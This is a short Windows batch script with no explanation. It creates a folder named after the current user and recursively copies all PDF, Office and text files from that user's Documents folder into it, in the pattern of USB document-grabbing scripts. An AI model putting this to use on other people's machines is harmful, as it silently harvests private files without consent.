@echo off
IF NOT EXIST ".\X\"%USERNAME% MD ".\X\"%USERNAME%
cd ".\X\"%USERNAME%
for /R %USERPROFILE%/Documents %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt) do copy "%%x" ".\"
EXIT
